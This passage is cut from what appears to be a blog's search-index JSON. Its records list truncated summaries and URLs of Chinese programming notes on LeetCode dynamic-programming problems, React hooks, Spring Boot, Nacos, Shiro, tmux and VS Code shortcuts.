当另一个信封的宽度和高度都比这个信封大的","lvl0":"lc.354.俄罗斯套娃信封问题","lvl1":null,"lvl2":"摘要","objectID":"f98c26775167882007f450fdbfcd953c","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/lc.354.%E4%BF%84%E7%BD%97%E6%96%AF%E5%A5%97%E5%A8%83%E4%BF%A1%E5%B0%81%E9%97%AE%E9%A2%98/"},{"content":"368. 最大整除子集 Difficulty: 中等 给你一个由 无重复 正整数组成的集合 nums ，请你找出并返回其中最大的整除子集 answer ，子集中每一元素对 (answer[i], answer[j]) 都应当满足： answer[i] % answer[j] == 0 ，或 answer[j]","lvl0":"lc.368.最大整除子集","lvl1":null,"lvl2":"摘要","objectID":"345fab4694e72d18e2d13e40a5300168","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/lc.368.%E6%9C%80%E5%A4%A7%E6%95%B4%E9%99%A4%E5%AD%90%E9%9B%86/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 class Solution { public: int findNumberOfLIS(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int n = nums.size(); vector\u0026lt;int\u0026gt; dp(n,1),cnt(n,1); int maxLen = 1; for(int i=1;i\u0026lt;n;++i) { for(int j=0;j\u0026lt;i;++j) { if(nums[j]\u0026lt; nums[i]) { if(dp[j] + 1\u0026gt; dp[i]) { dp[i] = dp[j] + 1; cnt[i] = cnt[j]; }else","lvl0":"lc.673.最长上升子序列个数","lvl1":null,"lvl2":"摘要","objectID":"c45fa1fe1c33907d6acf76d85931129e","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E5%AD%90%E5%BA%8F%E5%88%97%E4%B8%AA%E6%95%B0/"},{"content":"740. 删除并获得点数 Difficulty: 中等 给你一个整数数组 nums ，你可以对它进行一些操作。 每次操作中，选择任意一个 nums[i] ，删除它并获得 nums[i] 的点数。之后，你必须删除 所有 等于","lvl0":"lc.740.删除并获得点数","lvl1":null,"lvl2":"摘要","objectID":"375173e7b01021283735ab271df76408","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BB%E9%97%AE%E9%A2%98%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc.740.%E5%88%A0%E9%99%A4%E5%B9%B6%E8%8E%B7%E5%BE%97%E7%82%B9%E6%95%B0/"},{"content":"978. 最长湍流子数组 Difficulty: 中等 当 A 的子数组 A[i], A[i+1], ..., A[j] 满足下列条件时，我们称其为_湍流子数组_： 若 i \u0026lt;= k \u0026lt; j，当 k 为奇数时， A[k] \u0026gt; A[k+1]，且当 k 为偶","lvl0":"lc.978. 最长湍流子数组","lvl1":null,"lvl2":"摘要","objectID":"d529ca714cd0394085478c9b66ac3250","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BB%E9%97%AE%E9%A2%98%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc978.%E6%9C%80%E9%95%BF%E6%B9%8D%E6%B5%81%E5%AD%90%E6%95%B0%E7%BB%84/"},{"content":"lru 通过linkedhashmap，hash中的节点用双向指针连接着，表示插入的顺序。因此保存这个顺序就可以每次都去除最久未使用的那个。 1 2 3","lvl0":"LRU【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"3b8f5c995f81ae9d1c6686791035fff1","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/lru/"},{"content":"","lvl0":"Manacher算法","lvl1":null,"lvl2":"摘要","objectID":"a78f00aa62aca8a29eae26128bac2b97","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%9B%9E%E6%96%87/manacher%E7%AE%97%E6%B3%95/"},{"content":"nacos学习 配置 xml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.4.RELEASE\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;spring-cloud.version\u0026gt;Finchley.SR2\u0026lt;/spring-cloud.version\u0026gt; \u0026lt;spring-cloud-alibaba.version\u0026gt;0.2.0.RELEASE\u0026lt;/spring-cloud-alibaba.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-alibaba-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud-alibaba.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; https://www.bilibili.com/video/BV1LQ4y127n4?p=18 Nacos 可","lvl0":"Nacos学习","lvl1":null,"lvl2":"摘要","objectID":"a4583cfabbab2e81e79b6b28a2c82eeb","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/springcloud/nacos%E5%AD%A6%E4%B9%A0/"},{"content":"参考学习视频 千峰的视频 利用 props.children 代替原来路由的写法","lvl0":"nextjs学习","lvl1":null,"lvl2":"摘要","objectID":"2f44df6d3dba089380dd7ae4bf53e6bc","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/nextjs/nextjs%E5%AD%A6%E4%B9%A0/"},{"content":"pagination分页组件 14分钟","lvl0":"pagination分页","lvl1":null,"lvl2":"摘要","objectID":"8d7aeabf92bfb729c49239a6328ab8e0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/antd%E4%BD%BF%E7%94%A8/pagination%E5%88%86%E9%A1%B5/"},{"content":"学习视频 参考 27分钟 自动刷新事件——27分钟","lvl0":"Pagination分页插件","lvl1":null,"lvl2":"摘要","objectID":"2f51dd91cd706ed0e5b75631228d71bb","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/pagination%E5%88%86%E9%A1%B5/"},{"content":"设置面板字体 点击 工具，常规选项， 设置字体大小 设置 preview sql字体 工具-\u0026gt; 常规选项 -\u0026gt; 字体 -\u0026gt; Code editor -\u0026gt; 设置大小","lvl0":"Pd 设置界面字体","lvl1":null,"lvl2":"摘要","objectID":"17efccd6893d555ee0e1df3ae894b2bd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/powerdesigner%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/powerdesigner%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E5%AD%97%E4%BD%93/"},{"content":"Power designer 几个选项介绍 P即primary，主键的意思 F即foreign key，外键的意思 M即mandatory，强制不可为空的意思","lvl0":"Powerdesigner的几个选项","lvl1":null,"lvl2":"摘要","objectID":"9f48e81ac796d0a492d220569e43f4c8","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/powerdesigner%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/powerdesigner%E7%9A%84%E5%87%A0%E4%B8%AA%E9%80%89%E9%A1%B9/"},{"content":"父路由 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67","lvl0":"react router 管理","lvl1":null,"lvl2":"摘要","objectID":"47a62039d440e601b8a7006d9c50e883","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/react-router-%E7%AE%A1%E7%90%86/"},{"content":"react 刷新路由的方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import {withRouter} from \u0026#39;react-router-dom\u0026#39; //头顶部分 头像和 菜单 const TopRightMenu = () =\u0026gt; { // const history = createHashHistory() console.log(props) const Jump = (e)","lvl0":"react 刷新路由","lvl1":null,"lvl2":"摘要","objectID":"b0977a73e7bddca64ee374871cfb9c72","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/react-%E5%88%B7%E6%96%B0%E8%B7%AF%E7%94%B1/"},{"content":"React.lazy 和 React.Suspense 可以做 注意了： lazy 不能单独出现，要配合 Suspense 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48","lvl0":"react 组件懒加载","lvl1":null,"lvl2":"摘要","objectID":"883f2bcf7dd764fb24386554a2bfc064","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/react-%E7%BB%84%E4%BB%B6%E6%87%92%E5%8A%A0%E8%BD%BD/"},{"content":"参考学习教程 参考教程， 10分开始 组件 css样式互不覆盖解决方法 第11分钟开始学习 将 child.css 改为 child.module.css 这样就可以实现模块化 跨域问题解决方法 跨域问题解决方","lvl0":"react实战","lvl1":null,"lvl2":"摘要","objectID":"23847fcc4822d972f170ea684677818e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/react%E5%AE%9E%E6%88%98/"},{"content":"css互不影响 学习视频_参考 17分开始 1 2 3 4 5 6 7 8 import style from \u0026#39;./child.module.css\u0026#39; console.log(style) export default function Child() { return ( \u0026lt;div className={style.item}\u0026gt;\u0026lt;/div\u0026gt; ) } 用 style.item 就可以获取到类名 设置引入 scss 配置 sass 如何使用 查看 第3分","lvl0":"react样式互不影响","lvl1":null,"lvl2":"摘要","objectID":"e07532553571bff21c80f3dd003eaa11","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/react-%E6%A0%B7%E5%BC%8F%E4%BA%92%E4%B8%8D%E5%BD%B1%E5%93%8D/"},{"content":"redux使用教程 参考 1 2 cnpm i --save redux react-redux 状态持久化 参考视频","lvl0":"redux使用","lvl1":null,"lvl2":"摘要","objectID":"50271dfe71ef10a0fbbc75b1c7800ea8","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/redux%E4%BD%BF%E7%94%A8/"},{"content":"redux状态管理 redux 工作流程视频 其他解释： 可以理解为观察者模式 reducer 接收一个老状态， 返回一个新状态 然后回调通知 react 组件 参考官网文档 react redux原理","lvl0":"redux状态管理","lvl1":null,"lvl2":"摘要","objectID":"9248dc251154325042c3689529c264a4","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/redux%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86/"},{"content":"RN 创建项目 1 2 3 4 5 6 npm i -g expo-cli expo init novel_v1 cd novel_v1 yarn yarn android #这边需要开启android的模拟器 使用Expo开发应用程序需要两种工具：本地开发工具和用于打","lvl0":"RN创建项目","lvl1":null,"lvl2":"摘要","objectID":"018678974201f9ba411ce4507c4fecda","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react-native/rn%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE/"},{"content":"配置shiro框架 基本认识 shiro自带了几种默认的拦截器 authc [需要登录，rememberMeAuthentiationToken] 进行登录 anon","lvl0":"shiro框架的简单使用","lvl1":null,"lvl2":"摘要","objectID":"872e51c976f04db1a71bc583798a6a4a","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/shiro%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/shiro%E6%A1%86%E6%9E%B6%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"},{"content":"大文件切片上传服务器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60","lvl0":"Sprignboot 大文件切片上传服务器","lvl1":null,"lvl2":"摘要","objectID":"199e09de21de9c0588c86227d465b5e5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E6%96%87%E4%BB%B6%E5%88%87%E7%89%87%E4%B8%8A%E4%BC%A0%E6%9C%8D%E5%8A%A1%E5%99%A8_v2/"},{"content":"Java springboot实现 小文件上传本地服务器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47","lvl0":"Sprignboot 小文件上传服务器","lvl1":null,"lvl2":"摘要","objectID":"595d13b6f3e6c7b40145c62d3485ecb8","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%8D%E5%8A%A1%E5%99%A8_v1/"},{"content":"springboot设置静态文件路径 1 2 3 4 5 6 7 8 9 spring:datasource:url:jdbc:mysql://localhost:3306/a?useUnicode=true\u0026amp;characterEncoding=UTF-8\u0026amp;useSSL=falsedriver-class-name:com.mysql.jdbc.Driverusername:rootpassword:rootweb:resources:static-locations:classpath:/static/,file:D:/ASUS/Desktop/app/ file:绝对路径目录地址","lvl0":"Springboot 设置静态文件路径","lvl1":null,"lvl2":"摘要","objectID":"cfe5102404a0f6cb813a3a8c4844de9b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/springboot/springboot%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 @Value(\u0026#34;${spring.profiles.active}\u0026#34;) private String profile; private boolean isDebug; @PostConstruct private void init() { isDebug = \u0026#34;dev\u0026#34;.equalsIgnoreCase(profile); log.info(\u0026#34;环境变量 {} {}\u0026#34;,profile,isDebug); }","lvl0":"springboot判断测试环境","lvl1":null,"lvl2":"摘要","objectID":"924ebeaf5bac9e17b88a27f7bdda5654","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83/"},{"content":"springboot解决跨域设置 前端设置每次请求携带 cookie【携带sessionid】 1 2 3 4 axios.defaults.headers.common[\u0026#39;token\u0026#39;] = getToken(); // axios.defaults.headers.common[\u0026#39;refreshToken\u0026#39;] = getRefreshToken(); axios.defaults.withCredentials=true 后端设置 跨域头 1 2 3 4 5 6","lvl0":"springboot解决跨域设置","lvl1":null,"lvl2":"摘要","objectID":"045de0873e65b451ea99d884795e12f5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E8%B7%A8%E5%9F%9F%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"content":"寻找 swagger的依赖 1 2 3 4 5 6 7 \u0026lt;!-- https://mvnrepository.com/artifact/com.github.xiaoymin/knife4j-spring-boot-starter --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.xiaoymin\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;knife4j-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 这里 我使用 knife4j 其实是一样的。 官方文档 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26","lvl0":"Swagger2框架使用","lvl1":null,"lvl2":"摘要","objectID":"d573ddd925a577590121290f75ef82d0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/swagger2/swagger2%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/"},{"content":"1. 安装tmux 1 2 3 4 5 # linux yum install -y tmux # mac brew install tmux 2. tmux常用命令 2.1. 进入tmux 1 tmux 2.2. 退出tmux，程序后台运行 1 按ctrl + b 进入控制台，再","lvl0":"tmux快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"faa6bd61a4a7d9b92e9cc38090638f7f","tags":["tmux"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/tmux-keymap/"},{"content":"参考项目","lvl0":"ts react 参考项目","lvl1":null,"lvl2":"摘要","objectID":"4a3ebcd8d20a7df74e3bb4ccf74e7894","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/ts%E4%BD%BF%E7%94%A8/%E5%8F%82%E8%80%83%E9%A1%B9%E7%9B%AE/"},{"content":"useContext 父子组件传值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import React, { createContext, useContext, useState } from \u0026#34;react\u0026#34;; const CntCtx = createContext() function Child1() { let parentCnt = useContext(CntCtx) return ( \u0026lt;div\u0026gt;","lvl0":"use Context 父子传值","lvl1":null,"lvl2":"摘要","objectID":"f68051974a214fdc5ef7d05983fc8aca","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/usecontext-%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"},{"content":"类型 mounted 的实现 参考博客 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import React, { useEffect, useState } from \u0026#34;react\u0026#34;; export default function LifeCycleExample() { const [cnt , setCnt] = useState(0) useEffect(()=\u0026gt;{ //useEffect 不影响视图更新，异步延迟执行，不是同步的","lvl0":"use Effect 生命周期函数","lvl1":null,"lvl2":"摘要","objectID":"9e6afbd5a322b578fb7a71202effe3d3","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/useeffect%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/"},{"content":"useMemo使用示例 参考学习视频 这东西 和 vue 的 watch 差不多 useMemo 和 useEffect区别 相同点 两者在写法上有很大的相同之处 useMemo第一个参数需","lvl0":"use Memo 解决子组件重复执行问题","lvl1":null,"lvl2":"摘要","objectID":"0a2506de659e70df7b7b7a533e7aedae","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/usememo%E8%A7%A3%E5%86%B3%E9%87%8D%E5%A4%8D%E6%9B%B4%E6%96%B0%E9%97%AE%E9%A2%98/"},{"content":"用 use reducer 代替 redux的方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import React, { useReducer } from \u0026#39;react\u0026#39; const Child1 = (props)=\u0026gt; { console.log(props) return (","lvl0":"use reducer 代替redux","lvl1":null,"lvl2":"摘要","objectID":"0629c36f14a256e3a4d2088b4da08936","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/usereducer%E4%BB%A3%E6%9B%BFredux/"},{"content":"ref 使用方法 Refs 在 React 中起初的作用是做到对Dom 元素的引用，当我们想操作的原生 DOM 元素的时候，我们可以使用Ref 做到对元素的引用。 除了保持对 DOM 元素的","lvl0":"use Ref 获取 DOM元素","lvl1":null,"lvl2":"摘要","objectID":"4f732bbb6f2e0c0eacf93cb91f485a16","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/useref%E8%8E%B7%E5%8F%96-dom%E5%85%83%E7%B4%A0/"},{"content":"v-permission 自定义全选 参考学习视频 参考代码","lvl0":"v-permission 学习","lvl1":null,"lvl2":"摘要","objectID":"b2432070162f889e9634c41d91c9252e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/v-permission%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/"},{"content":"vscode快捷键 1. 基本快捷键 1.1. VsCode 快捷键有五种组合方式 Ctrl + Shift + ? : 这种常规组合按钮 Ctrl + V Ctrl +V : 同时依赖一个按键的组合 Shift + V c : 先组合后单键的","lvl0":"vscode快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"1ab70effe27f11b72dde4eb440de2727","tags":["vscode"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/vscode-keymap/"},{"content":"vscode下面 开发 golang的一些总结 go field to struct","lvl0":"vscode插件安装","lvl1":null,"lvl2":"摘要","objectID":"4f1017b9c5674aaab511adab7822a14e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E9%AA%9A%E6%93%8D%E4%BD%9C/vscode%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"content":"参考项目学习 参考的视频","lvl0":"Vue 父子组件互传","lvl1":null,"lvl2":"摘要","objectID":"d06260549ec1f0078ef1350ae2378ed9","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/vue/%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BA%92%E4%BC%A0/"},{"content":"https://blog.csdn.net/cywosp/article/details/23397179 https://blog.csdn.net/qq_43621789/article/details/106917404 一致性哈希算法 哈希算法好坏的定义 1、平衡性(Balance)：平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使得所有的缓冲","lvl0":"一致性哈希算法【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"271b9ef4e9119303c1485e2980e07bf6","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95/"},{"content":"600. 不含连续1的非负整数 Difficulty: 困难 给定一个正整数 n，找出小于或等于 n 的非负整数中，其二进制表示不包含 **连续的1 **的个数。 示例 1: 1 2 3 4 5 6 7 